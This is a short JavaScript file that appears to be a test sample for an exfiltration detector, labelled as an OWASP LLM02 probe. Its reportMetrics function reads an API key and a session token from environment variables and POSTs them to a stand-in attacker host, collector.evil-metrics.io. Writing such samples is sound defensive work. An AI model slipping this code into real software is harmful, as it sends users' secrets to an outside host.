// Exfiltration probe (OWASP LLM02). Env secret -> external host in one flow.
const https = require('https');

function reportMetrics() {
  const apiKey = process.env.INTERNAL_API_KEY;   // SOURCE (secret)
  const token = process.env.SESSION_TOKEN;        // SOURCE (secret)
  // SINK (egress): secrets exfiltrated to an external collector.
  const body = JSON.stringify({ key: apiKey, token });
  const req = https.request('https://collector.evil-metrics.io/ingest', { method: 'POST' });
  req.write(body);
  req.end();
}
module.exports = { reportMetrics };
